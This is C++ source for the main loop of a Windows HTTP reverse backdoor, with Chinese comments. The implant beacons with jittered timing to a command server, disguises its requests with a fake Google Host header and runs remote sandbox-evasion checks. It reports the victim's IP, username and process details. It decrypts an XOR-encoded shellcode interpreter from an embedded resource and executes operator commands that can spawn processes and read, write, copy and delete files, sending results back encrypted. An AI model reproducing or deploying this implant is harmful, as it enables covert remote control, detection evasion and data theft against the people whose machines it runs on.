#include <map>
#include <iostream>
#include <windows.h>
#include "resource.h"

#include "Cryptor.h"
#include "AntiSandbox.h"
#include "HttpConnect.h"
#include "CommandController.h"

/*
* 解释器 ShellCode: https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release
* 2.C/C++
* 代码生成: 运行库(多线程)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
* 系统: 子系统(窗口)
* 高级: 入口点(mainCRTStartup)
*/

using namespace std;

// HTTP 反向后门
int main() {
	srand(time(NULL));

	char fid[] = "[FID]"; // 文件ID
	char sid[10]; // 会话ID (数据库主键，不保证重复)
	sprintf_s(sid, sizeof(sid), "%d", rand() % 10000000);

	char sessionInfo[200] = ""; // 会话信息
	int sessionInfoLength;

	double iniHeartbeat = 1.5; // 基础心跳
	double heartbeatDevMax = 0.5; // 心跳偏移

	// 连接信息
	char host[] = "127.0.0.1";
	int port = 1234;
	char requestHeader[] =
		"POST / HTTP/1.1\r\n"
		"Host: www.google.com.hk\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: close\r\n"
		"Content-Length: ";

	queue<ConnectData> commandDataQueue; // 命令数据队列
	queue<ConnectData> commandOutputDataQueue; // 命令输出数据队列

	map<int, char*> selfAsmHashMap; // 自定义汇编哈希字典: [自定义汇编哈希: 自定义汇编, ...]
	char* selfAsmHashInfo = (char*)malloc(1024); // 自定义汇编哈希信息: ,自定义汇编哈希,自定义汇编哈希,...
	*selfAsmHashInfo = '\0';

	int isSandbox = -1; // 是否在沙箱
	PVOID pMagicInvoke = NULL; // 解释器函数指针
	while (1) {
		// 睡眠
		double heartbeatDev = ((double)rand() / RAND_MAX) * heartbeatDevMax * 2 - heartbeatDevMax;
		Sleep((iniHeartbeat + heartbeatDev) * 1000);

		// 远程抗沙箱
		if (isSandbox == -1) {
			// 获取“判定数据”: 命令ID(0)\0判定数据
			char* determineData;
			int determineDataLength;
			AntiSandbox(&determineData, &determineDataLength);

			// 判定数据 -> 命令输出数据队列
			ConnectData commandData = {};
			commandData.data = determineData;
			commandData.dataLength = determineDataLength;
			commandOutputDataQueue.push(commandData);

			// 构造“待定会话信息”: 会话类型(0)\0FID,SID,内网IP,XOR1,XOR2,随机数
			if (*sessionInfo == '\0') {
				ConstructPendingSessionInfo(fid, sid, sessionInfo, &sessionInfoLength);
			}
		}
		// 正式上线
		else {
			// 构造“正式上线会话信息”: 会话类型(1)\0FID,SID,内网IP,用户名,进程名,PID,位数,随机数
			if (*sessionInfo == '\0') {
				ConstructSessionInfo(fid, sid, sessionInfo, &sessionInfoLength);
			}
		}

		// 重新随机加密会话信息
		char obfRandom[5] = "";
		sprintf_s(obfRandom, sizeof(obfRandom), "%d", rand() % 10);
		DecryptData(sessionInfo, sessionInfoLength);
		*(sessionInfo + sessionInfoLength - 1) = *obfRandom;
		EncryptData(sessionInfo, sessionInfoLength);

		// HTTP 请求 (发送“命令输出数据”& 接收“命令数据”)
		HttpRequest(host, port, requestHeader, sessionInfo, sessionInfoLength, selfAsmHashInfo, commandDataQueue, commandOutputDataQueue);

		// 执行命令
		int xor1;
		int xor2;
		while (commandDataQueue.size()) {
			// 命令数据 <- 命令数据队列
			DecryptData(commandDataQueue.front().data, commandDataQueue.front().dataLength);

			char* commandId = commandDataQueue.front().data;
			char* data = commandDataQueue.front().data + strlen(commandId) + 1;
			int dataLength = commandDataQueue.front().dataLength - strlen(commandId) - 1;

			// 远程抗沙箱命令
			if (*commandId == '0') {
				switch (*data)
				{
				case '0':
					isSandbox = 1;
					return 0;
				case '1':
					isSandbox = 0;
					xor1 = atoi(data + 1);
					xor2 = atoi(data + 1 + strlen(data + 1) + 1);
					*sessionInfo = '\0';
				}
			}
			// 正式上线命令
			else {
				// 加载解释器 ShellCode
				if (pMagicInvoke == NULL) {
					HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"BIN");
					DWORD size = SizeofResource(NULL, res);
					HGLOBAL load = LoadResource(NULL, res);

					pMagicInvoke = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
					for (int i = 0; i < size; i++) {
						*((PBYTE)pMagicInvoke + i) = *((PBYTE)load + i) ^ xor1 ^ xor2;
					}

					DWORD oldProtect;
					VirtualProtect(pMagicInvoke, size, PAGE_EXECUTE_READ, &oldProtect);
				}

				// 调用解释器
				int selfAsmOrHashLength = atoi(data);
				char* selfAsmOrHash = data + strlen(data) + 1;
				char* selfAsm = GetSelfAsm(selfAsmOrHash, selfAsmOrHashLength, selfAsmHashMap, selfAsmHashInfo);
				char* commandParaLength = selfAsmOrHash + selfAsmOrHashLength + 1;
				char* commandPara = commandParaLength + strlen(commandParaLength) + 1;
				char* outputData;
				int outputDataLength;
				PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToLocalFileTime, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA };
				((void(*)(...))pMagicInvoke)(selfAsm, commandPara, atoi(commandParaLength), &outputData, &outputDataLength, funcAddr);

				// 构造“命令输出数据”: 命令ID\0输出数据 & 长度
				int commandOutputDataLength = strlen(commandId) + 1 + outputDataLength;
				char* commandOutputData = (char*)malloc(commandOutputDataLength);
				memcpy(commandOutputData, commandId, commandOutputDataLength - outputDataLength);
				memcpy(commandOutputData + commandOutputDataLength - outputDataLength, outputData, outputDataLength);
				free(outputData);

				EncryptData(commandOutputData, commandOutputDataLength);

				// 命令输出数据 -> 命令输出数据队列
				ConnectData commandData = {};
				commandData.data = commandOutputData;
				commandData.dataLength = commandOutputDataLength;
				commandOutputDataQueue.push(commandData);
			}

			free(commandDataQueue.front().data);
			commandDataQueue.pop();
		}
	}
}